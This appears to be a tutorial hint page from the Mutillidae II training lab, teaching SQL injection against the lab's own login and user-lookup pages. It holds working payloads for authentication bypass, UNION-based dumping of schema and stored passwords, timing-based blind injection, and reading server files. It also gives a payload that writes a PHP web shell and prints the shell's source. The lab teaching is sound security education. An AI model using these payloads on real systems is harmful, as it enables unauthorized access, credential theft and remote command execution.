			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			SQL injection may occcur
			when user or attacker controlled input is later incorporated
			into an SQL query which is built and executed by the web application.
			Web applications which do not implement code-data segmentation by
			using routines (i.e. - stored procedures, user-defined functions) may be
			vulnerable. Some sites attempt to parameterize queries which prevents
			SQL injection but fails to meet other objectives such as least-privilege.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Inject all available parameters of the web page with charaters reserved
			in SQL, PL/SQL, T-SQL, and MySQL. Examine responses for difference from
			responses with normal input. Additionally attempt to inject valid SQL
			statements including statements which cause errors, induce pauses,
			and cause differences when similar statements evaluate to true or false.
			<br/><br/>
			You may use tools like Burp-Suite and SQLMap to fuzz sites quickly
			<br/><br/>
			<span class="report-header">Reconnaissance</span>
			<br/><br/>
			Error messages can be excellent sources of information.
			Developers are often naive about error messages and allow their apps to display
			errors rather than log the errors privately or email them to support staff. Secure
			sites use custom error pages that display no error messages.
			Finding an error message with respect to SQLi typically involves malforming the
			query on purpose. Special characters can get the job done. Single-quotes and
			parenthesis often cause errors in SQL Server, Oracle and MySQL databases. Dont
			forget to use different encodings of each character to see if that makes a difference.
			For example, try URL encoding, hex, etc. Try those
			first, then move onto any character that is not alpha-numeric.
			<br/><br/>
			Hint: Go to the documentation for ANSI-SQL, Oracle, SQL Server, and MySQL to see which characters
			are reserved in those respective systems. (ANSI-SQL is the "common" SQL shared by all compliant databases.)
			In particular, determine what are the comment symbols for the respective systems.
			<br/><br/>
			Try to find out what type of database is behind the application. Knowing
			if the database is Oracle, SQL Server, or MySQL can help a lot. Each has its own meta-tables,
			functions, system tables, system procedures, and vulnerabilities. If the database is SQL Server
			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures.
			They both implement this SQL-92 standard structure. Oracle uses non-standard
			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>.
			<br/><br/>
			Sometimes the type of database can be infered by its behavior. For example,
			SQL Server and MySQL both use "--" (double-hyphen) as the comment symbols; however,
			MySQL requires a space betwwen the comment symbol and the next character.
			<br /><br />
			This statement is a valid SQL injection against either SQL Server or MySQL:
			<br/>
<code>
' union select/**/name/**/FROM/**/INFORMATION_SCHEMA.TABLES--
</code>
			<br />
			MySQL can be identified by whether the injection requires a space on the end. Oracle
			and SQL Server do not care if there is a space at the end of the injection or not. But
			MySQL needs the space on the end. (At least when used with PHP.)
			<br />
<code>
' union select name FROM INFORMATION_SCHEMA.TABLES-- (&lt;-- space required here)
</code>
			<br/>
			Determine the page capibilities. If the page displays database records, standard SQL
			injection is probably the better tool. If the page processes queries but does not display query output
			(i.e. - a login page), then blind SQLi may be the better tool.
			<br/><br/>
			Use the page normally and observe the behavior. For example, log into Mutillidae. Does Mutillidae
			display any information from the database because you log-in? (No)
			What happens when using page user-info.php?
			Does any data displaywhen using page user-info.php? (Yes)
			The login page is likely going to be a better candidate for blind SQL injection while user-info.php
			is likely a better candidate for direct SQL injection.
			<br/><br/>
			<span class="report-header">Scanning</span>
			<br /><br />
			Get specifications on database software (Example Page: user-info.php)
			<br />
<code>
' union select null, database(), current_user(), version() --
</code>
			<br/>
			If the meta-tables are available, they can footprint the database structure making
			the next steps much more productive.
			<br/><br/>
			Check the documentation for Oracle, MySQL, and SQL Server. Determine the meta-table structures,
			table/view names, and column names.  If the database is SQL Server
			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures.
			They both implement this SQL-92 standard structure. Oracle uses non-standard
			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>.
			<br/><br/>
			Extract table names from database. (Example Page: user-info.php)
			<br />
<code>
' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES--
</code>
		<br/>
		Extract table columns from database using a single field (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--
</code>
		<br/>
		Extract views from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS--
</code>
		<br/>
		Extract triggers from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS--
</code>
		<br/>
		Extract routines/procs from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES--
</code>
		<br/>
		Extract table columns from database (Example Page: user-info.php)
		<br />
<code>
' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS--
</code>
		<br/>
		Blind SQL injection does not depend on seeing any resulting records. Instead, page timing can be used.
		<br/><br/>
		Blind SQL Injection/Brute Forcing values (Example Page: login.php)
		<br />
<code>
' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null --
</code>
		<br/>
			<span class="report-header">Exploitation</span>
			<br/>
			<ol class="tutorial">
				<li>
					Determine if SQL injection exists
					<br/><br/>
					<ul>
						<li>
							Try injecting characters reserved in databases to produce error messages
							<br/><br/>
							<span class="important-code">single-quote<br/>back-slash<br/>double-hyphen<br/>forward-slash<br/>period</span>
							<br/><br/>
						</li>
						<li>If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.</li>
						<li>
							If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
							<br/><br/>
							<span class="important-code">
								Technique: Blind SQL Injection - True and False Values<br/>
								Field: username<br/>
								True Value (Using Proxy): &#39; or 1=1 --<br/>
								False Value (Using Proxy): &#39; and 1=0 --<br/>
							</span>
							<br/>
						</li>
						<li>
							If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
							<br/><br/>
							<span class="important-code">
								&#39; union Select null, null, null, sleep(5) --
							</span>
							<br/><br/>
						</li>
					</ul>
				</li>
				<li>
					Determine injection types that work<br/><br/>

					<ul>
						<li>Determine the prefix and suffix needed to make the injected code "fit" syntatically
							then add a payload between. Inject the exploit.
							<br/><br/>
							Example: Some pages on the site are vulnerable to
							<br/>
<code>
' or 1=1 -- (Note: There is a space on the end of this expression)
</code>
			<br/>
			Note that some characters which are reserved in databases are also reserved
			in web servers. If submitting injections directly via an interception proxy
			like Burp-Suite, URL encode the injection to avoid a syntax error on the
			web server.
			<br/><br/>
			URL Encoded version
			<br/>
<code>
%27%20%6f%72%20%31%3d%31%20%2d%2d%20
</code>
<br/>

					</li>
					<li>
						UNION statements
						<br/><br/>
						<ul>
							<li>Determine number of columns in application query. Inject NULL columns until injected query works.</li>
							<li>Determine position of a varchar or equivalent column</li>
							<li>Use position of found column(s) to place injected columns. Use NULL for rest</li>
							<br/>
						</ul>
					</li>
					<li>Inline injection
						<br/><br/>
						<ul>
							<li>Usually happens when ORDER BY or HAVING clause present in application query</li>
							<br/>
						</ul>
					</li>
					<li>Timing injection
						<br/><br/>
						<span class="important-code">
							Technique: Blind SQL Injection - Timing<br/>
							Page: login.php<br/>
							Field: username<br/>
							Value (Using Proxy): &#39; union Select null, case SUBSTRING(current_user(),1,1) when &#39;r&#39; THEN sleep(5) ELSE sleep(0) END, null, null --<br/>
							Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&amp;password=&amp;login-php-submit-button=1
						</span>
						<br/><br/>
					</li>
				</ul>
			</li>
			<li>
				Attempt to determine database server brand
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: username<br/>
					Value (Using Proxy): &#39; union select null,VERSION() AS username,null,null -- <br/>
				</span>
				<br/>
			</li>
			<li>Formulate and test query</li>
			<br/>
			<li>Attempt to determine database name
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: username<br/>
					Value (Using Proxy): &#39; union select null,DATABASE() AS username,null,null -- <br/>
				</span>
				<br/>
			</li>
			<li>Attempt to determine schema name
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: username<br/>
					Value (Using Proxy): &#39; union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES-- <br/>
				</span>
				<br/>
			</li>
			<li>
				Attempt to determine table(s) names
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: username<br/>
					Value (Using Proxy): &#39; union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- <br/>
				</span>
				<br/>
			</li>
			<li>Attempt to determine column(s) names
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Recon: Extract table columns from database using a single field<br/>
					Page: user-info.php<br/>
					Field: Username<br/>
					Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--<br/>
				</span>
				<br/>
			</li>
			<li>
				Attempt to extract data
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: Username<br/>
					Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
				</span>
				<br/>
			</li>
			<li>
				Attempt to read files from server
				<br/><br/>
				<span class="important-code">
					Technique: Direct Injection<br/>
					Page: user-info.php<br/>
					Field: username<br/>
					Value (relative path):<br/>
					' union select null, LOAD_FILE('../README') AS username, null, null--<br/><br/>
					Value (absolute path):<br/>
					' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--<br/>
					' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--<br/>
				</span>
				<br/>
			</li>
			<li>Attempt to upload files to server</li>
			<br/>
			<li>
				Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited
				system command abilities. SQL Server 2008 disables system commands by default and requires
				them to be enabled.
			</li>
			<br/>
			<li>
				Attempt to determine database computer name, IP address, username, version, etc.
				<br/><br/>
				<span class="important-code">
					MySQL Functions:<br/>
					VERSION() - MySQL server version<br/>
					USER() - Database user issuing query<br/>
					DATABASE() - Database on server against which query is running
					<br/><br/>
				</span>
			</li>
			<li>
				Attempt to pivot to database server level. This will largely depend on either being able to execute
				system commands via the database server or upload files to the file system. Uploading files would allow
				web application pages to be uploaded which can contain system calls.
			</li>
		</ol>
		<span class="report-header">Gaining Access</span>
		<br/><br/>
		Extract passwords from user table (Example Page: user-info.php)
		<br />
<code>
' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts --
</code>
		<br/>
		Using SQL Injection (Page: login.php)
		<br />
<code>
' or 1=1 --
</code>
			<br/>
			<span class="report-header">
			Using advanced techniques: Open files on target operating system
			</span>
			<br/><br/>
			Page: user-info.php<br/>
			Field: username<br/>
	Values:<br/>
<code>
	&#39; union select null, LOAD_FILE(&#39;../README&#39;) AS username, null, null--
	&#39; union select null, LOAD_FILE(&#39;..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts&#39;) AS username, null, null--
	&#39; union select null, LOAD_FILE(&#39;..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf&#39;) AS username, null, null--
	&#39; union select null, LOAD_FILE(&#39;mysql_error.log&#39;), null, null--
	&#39; union select null, LOAD_FILE(&#39;..\\..\\..\\htdocs\\mutillidae\\index.php&#39;), null, null--
</code>
			<br/>
			<span class="report-header">
			Using advanced techniques: Writing files to operating system
			</span>
			<br/><br/>
			Page: user-info.php<br/>
			Field: username<br/>
			Value:<br/>
<code>
	&#39; union select null,null,null,null,&#39;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;&lt;table style=&quot;margin-left:auto; margin-right:auto;&quot;&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;Please enter system command&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;label&quot;&gt;Command&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pCommand&quot; size=&quot;50&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Execute Command&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;?php echo &quot;&lt;pre&gt;&quot;;echo shell_exec($_REQUEST[&quot;pCommand&quot;]);echo &quot;&lt;/pre&gt;&quot;; ?&gt;&#39; INTO DUMPFILE &#39;..\\..\\htdocs\\mutillidae\\backdoor.php&#39; --&nbsp;
</code>
			<br/>
			This is the source code for the web shell. Also try Laudinum.
			<br/>
<code>
	&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
		&lt;table style=&quot;margin-left:auto; margin-right:auto;&quot;&gt;
			&lt;tr&gt;
				&lt;td colspan=&quot;2&quot;&gt;Please enter system command&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td class=&quot;label&quot;&gt;Command&lt;/td&gt;
				&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pCommand&quot; size=&quot;50&quot;&gt;&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;
				&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;
					&lt;input type=&quot;submit&quot; value=&quot;Execute Command&quot; /&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
		&lt;/table&gt;
	&lt;/form&gt;
	&lt;?php
		echo &quot;&lt;pre&gt;&quot;;
		echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
		echo &quot;&lt;/pre&gt;&quot;;
	?&gt;
</code>
<br/><br/>
<span class="report-header">Example (Bypass Authentication)</span>
<br/><br/>
<ul>
	<li>Mutillidae II contains a login page that is vulnerable to SQL injection. Browse to login.php.</li>
	<li>Verify security level is 0</li>
	<li>Web applications using forms-based authentication often keep credentials in data stores.
	The system compares the username and password entered against the credentials on file.</li>
	<li>Sometimes causing error messages can help. Begin by injecting all characters/patterns that
	are reserved in SQL</li>
	<li>Reserved characters are used to form commands in the database. Try a single-quote (') or an
	opening comment symbol (/*) for example</li>
	<li>If the system sends error messages back to the client, the information may help construct better injections</li>
	<li>Note that errors may be embedded in HTML comments</li>
	<li>From the query in the error message, an injection can be formulated directly</li>
	<li>If the query was not available injection would still be possible but require more time</li>
	<li>For this particular query the following solution will work: ' or 5=5-- . There is a space at the end.</li>
</ul>
<br/>
<span class="report-header">Example (Dump user credentials)</span>
<br/><br/>
<ul>
	<li>Mutillidae II contains a "user lookup" page that is vulnerable to SQL injection. Browse to user-info.php.</li>
	<li>Verify security level is 0</li>
	<li>Page comes in SQL, XML and SOAP versions. Use the SQL version.</li>
	<li>Sometimes causing error messages can help. Begin by injecting all characters/patterns that
	are reserved in SQL</li>
	<li>Reserved characters are used to form commands in the database. Try a single-quote (') or an
	opening comment symbol (/*) for example</li>
	<li>If the system sends error messages back to the client, the information may help construct better injections</li>
	<li>Note that errors may be embedded in HTML comments</li>
	<li>From the query in the error message, an injection can be formulated directly</li>
	<li>If the query was not available injection would still be possible but require more time</li>
	<li>For this particular query the following solution will work: ' or 5=5-- . There is a space at the end.</li>
</ul>
<br/>
<span class="report-header">Example (Shorter Injections)</span>
<br/><br/>
<ul>
	<li>Tautologies like 5=5 resolve to TRUE or FALSE. In MySQL, TRUE = [not zero] and false = 0.
	Therefore, any positive number can be substituted for TRUE. Injections like ' OR 1 --
	are equivalents to injections like ' or 5=5 --
	</li>
	<li>In MySQL, # and -- are both comments but # is shorter. Injections like ' OR 1 #
	are equivalents to injections like ' or 5=5 --
	</li>
	<li>In MySQL, binary comparisons can cause a statement to evaluate to TRUE. Injections like '&1#
	are equivalents to injections like ' or 5=5 --
	</li>
</ul>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisSQLInjection);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->MutillidaeLab7Walkthrough);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->MutillidaeLab8Walkthrough);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->MutillidaeLab9Walkthrough);?>
<br/><br/>